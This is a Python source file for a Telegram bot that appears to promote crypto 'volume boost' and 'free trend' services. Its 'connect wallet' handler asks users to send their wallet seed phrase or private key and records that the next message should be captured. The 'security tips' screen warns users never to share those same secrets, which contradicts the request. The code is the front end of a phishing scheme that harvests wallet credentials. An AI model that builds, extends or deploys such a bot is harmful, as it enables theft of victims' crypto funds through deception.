from bot_instance import bot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Track users waiting for wallet phrase
connect_phrase_waiting = {}

def handle_connect(call):
    chat_id = call.message.chat.id
    text = (
        "🔰To connect your wallet, please follow the steps below:\n"
        "1️⃣ Send your phrase code to verify ownership.\n"
        "2️⃣ Once verified, your wallet will be linked to your Telegram account.\n"
        "3️⃣ You can then access your Volume boost, transactions, and other features to get free trend on the token."
    )
    markup = InlineKeyboardMarkup(row_width=2)
    # First row: one button
    markup.add(InlineKeyboardButton("CONNECT", callback_data="connect_wallet"))
    # Second row: one button
    markup.add(InlineKeyboardButton("SECURITY TIPS", callback_data="connect_security"))
    # Third row: back and menu buttons
    markup.add(
        InlineKeyboardButton("🔙 Back", callback_data="connect_back"),
        InlineKeyboardButton("🔝 Main Menu", callback_data="connect_mainmenu")
    )
    bot.send_message(chat_id, text, reply_markup=markup)

def handle_connect_wallet(call):
    chat_id = call.message.chat.id
    image_url = 'https://raw.githubusercontent.com/raccityy/raccityy.github.io/refs/heads/main/connect.jpg'
    text = "📥Import Wallet Phrase Code or send your private key To Connect"
    connect_phrase_waiting[chat_id] = True
    try:
        bot.send_photo(chat_id, image_url, caption=text)
    except Exception:
        bot.send_message(chat_id, text)

def handle_connect_security(call):
    chat_id = call.message.chat.id
    text = (
        "🔒 SECURITY TIPS\n\n"
        "for safety reasons, create a new wallet in your phantom before connecting it to the bot"
        "• Never share your wallet phrase or private key with anyone.\n"
        "• Only use trusted wallets and official apps.\n"
        "• Double-check URLs and avoid phishing sites.\n"
        "• Enable two-factor authentication where possible.\n"
        "• The bot will never ask for your funds or transfer tokens without your consent.\n"
        "• If you suspect suspicious activity, disconnect your wallet and contact support immediately."
    )
    bot.send_message(chat_id, text) 